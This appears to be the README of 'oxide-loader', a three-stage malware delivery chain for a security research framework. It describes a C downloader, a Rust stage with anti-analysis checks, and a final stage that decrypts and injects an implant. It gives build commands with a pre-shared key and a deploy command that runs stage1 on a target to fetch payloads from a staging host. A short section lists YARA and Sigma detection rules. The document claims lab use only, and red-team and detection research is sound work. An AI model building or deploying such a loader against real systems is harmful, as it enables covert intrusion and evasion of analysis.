# oxide-loader

3-stage payload delivery chain for the oxide security research framework.

**Lab use only. Default C2 is localhost. See `DISCLAIMER.md`.**

---

## Stages

| Stage | Language | Role |
|-------|----------|------|
| stage1 | C | Fetches stage2 over HTTP. < 20 KB. |
| stage2 | Rust | Anti-analysis checks, fetches stage3. |
| stage3 | Rust | Decrypts embedded implant, injects or executes. |

## Build

```bash
cd stage1 && make
cd stage2 && cargo build --release
python3 builder.py \
  --implant ../oxide/target/release/oxide-implant \
  --psk oxide-lab-psk \
  --salt $(cat ../oxide/certs/salt.hex) \
  --out-rs stage3/src/payload.rs --rebuild
```

## Deploy

Upload binaries to the oxide panel staging endpoint, then run stage1 on the target:

```bash
STAGE_URL=http://10.10.100.1:8080 ./stage1/build/stage1
```

## builder.py

Encrypts the implant with AES-256-GCM (PBKDF2-derived key) and generates
`stage3/src/payload.rs` for compile-time embedding.

```bash
python3 builder.py --help
```

## Detection

```
detection/
├── yara/   stage1_magic.yar, stage1_xor.yar, stage1_imports.yar
└── sigma/  stage1_network.yml
```

ATT&CK: T1105, T1497, T1055, T1027.
